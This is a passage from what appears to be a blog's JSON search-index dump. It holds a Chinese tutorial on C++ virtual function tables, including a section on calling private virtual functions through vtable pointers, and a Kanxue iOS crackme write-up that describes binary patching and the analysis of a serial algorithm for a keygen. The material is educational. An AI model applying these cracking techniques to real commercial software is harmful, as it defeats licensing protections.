*，取得虚函数表的地址，然后，再次取址就可以得到第一个虚函数的地址了，也就是Base::f()，这在上面的程序中得到了验证（把int* 强制转成了函数指针）。通过这个示例，我们就可以知道如果要调用Base::g()和Base::h()，其代码如下： (Fun)*((int*)*(int*)(&amp;b)+0); // Base::f() (Fun)*((int*)*(int*)(&amp;b)+1); // Base::g() (Fun)*((int*)*(int*)(&amp;b)+2); // Base::h() 这个时候你应该懂了吧。什么？还是有点晕。也是，这样的代码看着太乱了。没问题，让我画个图解释一下。如下所示： 注意：在上面这个图中，我在虚函数表的最后多加了一个结点，这是虚函数表的结束结点，就像字符串的结束符“\\0”一样，其标志了虚函数表的结束。这个结束标志的值在不同的编译器下是不同的。在WinXP+VS2003下，这个值是NULL。而在Ubuntu 7.10 + Linux 2.6.22 + GCC 4.1.3下，这个值是如果1，表示还有下一个虚函数表，如果值是0，表示是最后一个虚函数表。 下面，我将分别说明“无覆盖”和“有覆盖”时的虚函数表的样子。没有覆盖父类的虚函数是毫无意义的。我之所以要讲述没有覆盖的情况，主要目的是为了给一个对比。在比较之下，我们可以更加清楚地知道其内部的具体实现。 一般继承（无虚函数覆盖）下面，再让我们来看看继承时的虚函数表是什么样的。假设有如下所示的一个继承关系： 请注意，在这个继承关系中，子类没有重载任何父类的函数。那么，在派生类的实例中，其虚函数表如下所示：对于实例：Derive d; 的虚函数表如下：我们可以看到下面几点： 虚函数按照其声明顺序放于表中。 父类的虚函数在子类的虚函数前面。我相信聪明的你一定可以参考前面的那个程序，来编写一段程序来验证。 一般继承（有虚函数覆盖）覆盖父类的虚函数是很显然的事情，不然，虚函数就变得毫无意义。下面，我们来看一下，如果子类中有虚函数重载了父类的虚函数，会是一个什么样子？假设，我们有下面这样的一个继承关系。 为了让大家看到被继承过后的效果，在这个类的设计中，我只覆盖了父类的一个函数：f()。那么，对于派生类的实例，其虚函数表会是下面的一个样子： 我们从表中可以看到下面几点， 覆盖的f()函数被放到了虚表中原来父类虚函数的位置。 没有被覆盖的函数依旧。这样，我们就可以看到对于下面这样的程序， Base *b = new Derive(); b-&gt;f(); 由b所指的内存中的虚函数表的f()的位置已经被Derive::f()函数地址所取代，于是在实际调用发生时，是Derive::f()被调用了。这就实现了多态。 多重继承（无虚函数覆盖）下面，再让我们来看看多重继承中的情况，假设有下面这样一个类的继承关系。注意：子类并没有覆盖父类的函数。 对于子类实例中的虚函数表，是下面这个样子： 我们可以看到： 每个父类都有自己的虚表。 子类的成员函数被放到了第一个父类的表中。（所谓的第一个父类是按照声明顺序来判断的） 这样做就是为了解决不同的父类类型的指针指向同一个子类实例，而能够调用到实际的函数。 多重继承（有虚函数覆盖） 下面我们再来看看，如果发生虚函数覆盖的情况。 下图中，我们在子类中覆盖了父类的f()函数。 下面是对于子类实例中的虚函数表的图： 我们可以看见，三个父类虚函数表中的f()的位置被替换成了子类的函数指针。这样，我们就可以任一静态类型的父类来指向子类，并调用子类的f()了。如： Derive d; Base1 *b1 = &amp;d; Base2 *b2 = &amp;d; Base3 *b3 = &amp;d; b1-&gt;f(); //Derive::f() b2-&gt;f(); //Derive::f() b3-&gt;f(); //Derive::f() b1-&gt;g(); //Base1::g() b2-&gt;g(); //Base2::g() b3-&gt;g(); //Base3::g() 安全性每次写C++的文章，总免不了要批判一下C++。这篇文章也不例外。通过上面的讲述，相信我们对虚函数表有一个比较细致的了解了。水可载舟，亦可覆舟。下面，让我们来看看我们可以用虚函数表来干点什么坏事吧。 一、通过父类型的指针访问子类自己的虚函数我们知道，子类没有重载父类的虚函数是一件毫无意义的事情。因为多态也是要基于函数重载的。虽然在上面的图中我们可以看到Base1的虚表中有Derive的虚函数，但我们根本不可能使用下面的语句来调用子类的自有虚函数： Base1 *b1 = new Derive(); b1-&gt;f1(); //编译出错 任何妄图使用父类指针想调用子类中的未覆盖父类的成员函数的行为都会被编译器视为非法，所以，这样的程序根本无法编译通过。但在运行时，我们可以通过指针的方式访问虚函数表来达到违反C++语义的行为。（关于这方面的尝试，通过阅读后面附录的代码，相信你可以做到这一点） 二、访问non-public的虚函数另外，如果父类的虚函数是private或是protected的，但这些非public的虚函数同样会存在于虚函数表中，所以，我们同样可以使用访问虚函数表的方式来访问这些non-public的虚函数，这是很容易做到的。 如： class Base { private: virtual void f() { cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; } }; class Derive : public Base{ }; typedef void(*Fun)(void); void main() { Derive d; Fun pFun = (Fun)*((int*)*(int*)(&amp;d)+0); pFun(); } 结束语C++这门语言是一门Magic的语言，对于程序员来说，我们似乎永远摸不清楚这门语言背着我们在干了什么。需要熟悉这门语言，我们就必需要了解C++里面的那些东西，需要去了解C++中那些危险的东西。不然，这是一种搬起石头砸自己脚的编程语言。 文章转载：http://www.cppblog.com/dawnbreak/archive/2009/03/10/76084.aspx","tags":[{"name":"C++","slug":"C","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"},{"name":"vtable","slug":"vtable","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/vtable/"}]},{"title":"python各种用法总结","date":"2017-02-15T07:11:45.000Z","path":"2017/02/15/pythonNote/pythonNote/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[{"name":"python","slug":"python","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"}]},{"title":"看雪iOSCrackme破解报告","date":"2016-08-04T17:51:44.000Z","path":"2016/08/05/iOSCrackme/iOSCrackme/","text":"看雪iOSCrackme破解报告0x01.首先，利用classdump把crackme的头文件导出来，可以看到头文件只有6个，根据屏幕上的check按钮，很容易在控制器中找到如下函数 0x02.然后将可执行文件拉入IDA分析，直接跳到check这个函数。可以猜测这个函数应该就是加密函数。下面重点对这个函数进行详细分析。 0x03.在分析之前，先在手机屏幕上直接点击check，无反应。然后输入一定字符后再点击check，仍然没有反应。没有一点的错误提示，看来只能一步一步看汇编了。在IDA中先大概看下流程图的结构，拉到最底下，发现貌似成功的界面 不管怎样，先试试直接跳转到该地址，看能不能弹出成功的界面？: / 修改为B 0x0000C1AC 然后再屏幕上点击check，成功弹出welcome to kanxue的界面！再接再厉,看看中间都经历了什么步骤。 0x04.下面进入汇编，第一阶段，根据strlen函数很容易知道，这是在对用户输入的字符串进行长度判断，若不满足情况，直接跳到失败代码。name为14位，serialnumber为8位 既然是逆向工程，所以先分析下在弹出这个界面前的代码都在做写些什么,r11为我们输入的serialnumber然后可以发现如果栈中的值和serialnumber8次匹配成功就会弹出成功的界面。 0x05.一段插曲，不知道是程序自身的原因还是手机的问题，在一步步向下调试的时候，发现内存非法访问，为什么会出现这个问题呢？向上找的时候，发现这样一条指令MOV PC, PC按理说，根据arm处理器流水线的处理机制，PC会指向当前的下面两条指令，所以执行这条语句后应该会跳到VDUP.8 Q9, R1指令. 但是实际情况却是把拆成四条指令，并把r0的值变为了0，导致r2变化，从而非法访问了r2地址的内存。 所以为了让r0的值不改变,之前都是通过每次动态修register write $r0的值，导致每次调试都要在那两处下个断点，浪费了很多时间。后来直接把静态修改重新打包安装到手机，lsls r0 r0改为nop代替，同理下面还有一处，作相应的修改。 0x06.回到我们之前的分析，现在开始加密阶段，首先进入的是下面的一个循环 r0的值为栈中的某个地址，d18-d19的值为00-0f，然后循环了16次，每次都对d18-d19加一，所以循环结束后在栈中生成了一个16*16大小的矩阵，且值为00-ff. 0x07.接着往下面分析，又是一个循环。循环了256次，可以猜测应该是对上面的矩阵进行变换，分析可以发现这个循环通过r9(0xaaaaaaab)和r1相乘结果来对矩阵中的值进行交换。 在循环的结束的下一条地址下个断点，打印对应的内存，验证了我们的猜想。 我们之前的分析中好像还没有和我们输入的name和serialnumber有什么联系。接着分析，这个循环终于对name进行了存取操作，通过四次循环把name的前四位取出来与之前的矩阵加密后又放回到name的前四位。 内存图： 下面这一段有点繁琐，各种跳转，但是并不复杂，就是通过判断加密后的name的长度然后复制到栈中地址r8处。 接着又是一个循环，分析可知是对r8即刚才复制加密name后的内存进行每四位反序变换。 内存图： keep going！这一段不是很复杂，就是把刚才变换后的首地址r8向下的64个字节复制到内存栈中[sp 0x50]处。后来得知从这个地址到r8后的内存就是整个栈变化的结束，后面的四个循环并没有进行栈的存操作，只是将这块内存的值取出来加密。 内存图： 下面的四个循环很相似，都是将那块内存每次提取80个字节进行加密。刚好有80*4=320与内存块的字节数相同。 然后将这之后的寄存器值与对应的值相加spintf按%08x%08x%08x%08x%08x的格式写入栈。 最后对栈进行了5次存储，与后面分析可知这段内存就会与serialnumber进行匹配。 0x07.根据上面的步骤写出代码，注册机为一个命令行程序，运行程序会提示如数14位的字母和数字的字符串，然后根据此就会生成对应的serialnumber。效果图如下： 在手机中输入生成的name和serialnumber弹出成功的界面！","tags":[{"name":"crackme","slug":"crackme","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/crackme/"},{"name":"看雪","slug":"看雪","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/看雪/"},{"name":"iOS","slug":"iOS","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iOS/"}]}]